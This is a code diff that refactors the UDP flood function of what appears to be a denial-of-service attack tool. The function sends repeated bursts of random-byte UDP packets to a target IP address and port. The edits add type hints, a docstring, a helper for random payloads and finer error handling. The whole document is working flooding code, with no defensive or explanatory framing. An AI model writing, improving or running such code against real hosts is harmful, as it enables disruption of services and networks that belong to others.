@@ -1,22 +1,33 @@
 # Import modules
-import random
 import socket
 from colorama import Fore
+import tools.randomData as randomData
+
 
 # Create socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 
-def flood(target):
+def flood(target: tuple[str, int]) -> None:
+    """Send UDP packets to target.
+    
+    Args:
+        target: Tuple of (ip_address, port)
+    """
     for _ in range(16):
         try:
-            payload = random._urandom(random.randint(1, 60))
+            payload = randomData.random_bytes(1, 60)
             sock.sendto(payload, (target[0], target[1]))
-        except Exception as e:
+        except PermissionError:
             print(
-                f"{Fore.MAGENTA}Error while sending UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
+                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
+            )
+            break
+        except OSError as e:
+            print(
+                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending UDP: {e}{Fore.RESET}"
             )
         else:
             print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}UDP random packet sent! Payload size: {len(payload)}. {Fore.RESET}"
+                f"{Fore.GREEN}[+] {Fore.YELLOW}UDP packet sent! Payload size: {len(payload)}.{Fore.RESET}"
             )
